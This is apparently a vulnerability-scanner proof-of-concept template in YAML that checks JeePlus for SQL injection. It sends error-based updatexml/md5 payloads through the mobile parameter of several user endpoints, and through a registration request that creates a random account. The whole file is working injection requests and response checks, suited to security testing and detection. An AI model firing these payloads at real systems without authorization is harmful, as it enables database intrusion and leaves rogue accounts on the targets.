name: poc-yaml-jeeplus-sqli
binding: 4cf624bd-c752-4bee-9ff6-762b0c9625f2
manual: true
detail:
    author: 东晓南
    links:
        - https://www.freebuf.com/articles/web/220066.html
    vulnerability:
        id: CT-517563
        level: high
    warning: 该poc将会产生一个随机账号密码的账号，请注意删除
transport: http
set:
    p1: randomInt(13000000000, 13999999999)
    s1: randomInt(100000, 200000)
    roleName: randomLowercase(5)
    randomCode: randomInt(1000, 9999)
    loginName: randomLowercase(5)
    password: randomInt(100000, 200000)
payloads:
    payloads:
        resetPassword:
            action: |
                "resetPassword"
        validateMobile:
            action: |
                "validateMobile"
        validateMobileExist:
            action: |
                "validateMobileExist"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /a/sys/user/{{action}}?mobile={{p1}}%27and%20(updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1))%23
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r1:
        request:
            cache: true
            method: POST
            path: /a/sys/register/registerUser
            headers:
                Content-Type: application/x-www-form-urlencoded
                body: roleName={{roleName}}&mobile={{p1}}%27and%20(updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1))%23&randomCode={{randomCode}}&loginName={{loginName}}&password={{password}}&confirmNewPassword={{password}}&ck1=on
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0() || r1()
